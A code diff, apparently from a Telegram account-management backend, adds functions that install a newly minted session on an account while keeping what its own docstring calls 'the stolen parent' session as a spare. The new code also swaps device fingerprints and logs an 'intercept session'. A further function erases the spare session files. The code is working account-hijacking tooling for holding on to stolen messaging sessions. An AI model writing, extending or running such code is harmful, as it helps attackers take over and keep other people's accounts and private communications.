@@ -134,6 +134,86 @@ def account_has_spare(account: SocialAccount) -> bool:
     return session_file_has_auth_key(_media_root() / rel)
 
 
+def _parent_session_rel(account: SocialAccount) -> str:
+    rel = (account.session_file_path or "").strip()
+    if rel:
+        parent = str(Path(rel).parent).replace("\\", "/")
+        return f"{parent}/{account.id}_parent.session"
+    return f"sessions/{account.id}_parent.session"
+
+
+def install_new_keep_parent(account: SocialAccount) -> bool:
+    """Promote the minted session to the work file; keep the stolen parent in spare_*."""
+    blob = (getattr(account, "encrypted_spare_session", None) or "").strip()
+    spare_rel = (getattr(account, "spare_session_file_path", None) or "").strip()
+    dest_rel = (account.session_file_path or "").strip()
+    if not dest_rel:
+        dest_rel = spare_rel.replace("_spare.session", ".session") if spare_rel else f"sessions/{account.id}.session"
+        account.session_file_path = dest_rel
+    dest = _media_root() / dest_rel
+    dest.parent.mkdir(parents=True, exist_ok=True)
+    parent_rel = _parent_session_rel(account)
+    parent_path = _media_root() / parent_rel
+    parent_path.parent.mkdir(parents=True, exist_ok=True)
+
+    parent_wrote = False
+    if dest.is_file() and session_file_has_auth_key(dest):
+        copy_session_bundle(dest, parent_path)
+        parent_wrote = True
+    parent_blob = (getattr(account, "encrypted_session", None) or "").strip()
+    if not parent_wrote and parent_blob:
+        parent_wrote = restore_encrypted_session_file(parent_blob, parent_path)
+    if not parent_wrote:
+        return False
+
+    wrote = False
+    if spare_rel:
+        src = _media_root() / spare_rel
+        if src.is_file() and session_file_has_auth_key(src):
+            copy_session_bundle(src, dest)
+            wrote = True
+    if not wrote and blob:
+        wrote = restore_encrypted_session_file(blob, dest)
+    if not wrote:
+        return False
+
+    if dest.is_file():
+        account.encrypted_session = encrypt_session_bytes(dest.read_bytes())
+    elif blob:
+        account.encrypted_session = blob
+    if parent_path.is_file():
+        account.encrypted_spare_session = encrypt_session_bytes(parent_path.read_bytes())
+    elif parent_blob:
+        account.encrypted_spare_session = parent_blob
+    account.spare_session_file_path = parent_rel
+    new_device = getattr(account, "spare_telegram_device", None)
+    parent_device = getattr(account, "telegram_device", None)
+    if isinstance(new_device, dict) and new_device:
+        account.telegram_device = new_device
+        account.spare_telegram_device = parent_device if isinstance(parent_device, dict) else None
+    account.is_active = True
+    account.updated_at = _utc_now()
+    logger.warning("Installed new intercept session for account %s; parent kept at %s", account.id, parent_rel)
+    return True
+
+
+def clear_parent_session(account: SocialAccount) -> None:
+    rel = (getattr(account, "spare_session_file_path", None) or "").strip()
+    if rel:
+        path = _media_root() / rel
+        for candidate in (path, Path(str(path) + "-journal")):
+            try:
+                if candidate.is_file():
+                    candidate.unlink()
+            except OSError:
+                pass
+    account.encrypted_spare_session = None
+    account.spare_session_file_path = None
+    account.spare_telegram_device = None
+    account.spare_authorization_hash = None
+    account.updated_at = _utc_now()
+
+
 def _session_file_age_seconds(account: SocialAccount) -> float | None:
     rel = (account.session_file_path or "").strip()
     if not rel:
